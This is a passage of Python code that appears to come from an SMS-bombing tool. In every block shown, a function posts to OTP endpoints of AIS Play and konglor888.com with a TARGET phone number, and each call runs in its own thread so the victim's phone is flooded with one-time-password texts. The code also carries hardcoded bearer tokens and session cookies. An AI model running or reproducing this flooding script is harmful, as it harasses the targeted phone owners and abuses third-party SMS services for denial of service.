#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def am():
            rams=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rams)
        threading.Thread(target=am).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def an():
            rans=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rans)
        threading.Thread(target=an).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ao():
            raos=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(raos)
        threading.Thread(target=ao).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ap():
            raps=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(raps)
        threading.Thread(target=ap).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def aq():
            raqs=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(raqs)
        threading.Thread(target=aq).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ar():
            rars=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rars)
        threading.Thread(target=ar).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def at():
            rats=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rats)
        threading.Thread(target=at).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def au():
            raus=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(raus)
        threading.Thread(target=au).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def av():
            ravs=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(ravs)
        threading.Thread(target=av).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def aw():
            raws=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(raws)
